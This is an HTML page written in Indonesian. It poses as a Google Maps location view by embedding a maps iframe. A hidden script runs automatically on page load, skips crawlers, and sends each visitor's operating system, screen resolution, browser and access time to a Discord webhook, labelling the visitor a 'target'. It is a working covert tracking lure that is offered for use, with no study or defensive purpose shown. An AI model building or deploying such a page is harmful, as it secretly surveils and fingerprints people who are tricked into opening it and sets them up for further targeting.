<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Lokasi Terkini</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3151.8354345059!2d144.95373531531615!3d-37.8368179797454!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad65d4c2b349649%3A0xb6899234e561db11!2sEnvato!5e0!3m2!1sen!2sau!4v1631520000000!5m2!1sen!2sau"></iframe>

    <script>
        // MASUKKAN URL WEBHOOK SPIDEY BOT ANDA DI SINI
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnV..."; 

        async function sikatData() {
            // FILTER BOT: Supaya bot Google/Discord tidak kirim laporan palsu
            const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
            if (isBot) return;

            // DETEKSI OS YANG BENAR (Biar tidak Unknown OS)
            const ua = navigator.userAgent;
            let deviceType = "❓ Perangkat Tidak Dikenal";
            
            if (/android/i.test(ua)) deviceType = "📱 Android Phone";
            else if (/iPhone|iPad|iPod/i.test(ua)) deviceType = "🍎 iOS (iPhone/iPad)";
            else if (/Windows/i.test(ua)) deviceType = "💻 Windows PC";
            else if (/Linux/i.test(ua)) deviceType = "🐧 Linux System";

            const payload = {
                embeds: [{
                    title: "🎯 TARGET TERDETEKSI!",
                    color: 15158332, // Warna Merah
                    fields: [
                        { name: "Sistem Operasi", value: deviceType, inline: true },
                        { name: "Resolusi Layar", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                        { name: "Browser", value: navigator.vendor || "Default Browser", inline: false },
                        { name: "Waktu Akses", value: new Date().toLocaleString('id-ID'), inline: false }
                    ],
                    footer: { text: "Spidey Bot Monitoring" }
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        // Jalankan otomatis saat halaman selesai loading
        window.onload = sikatData;
    </script>
</body>
</html>
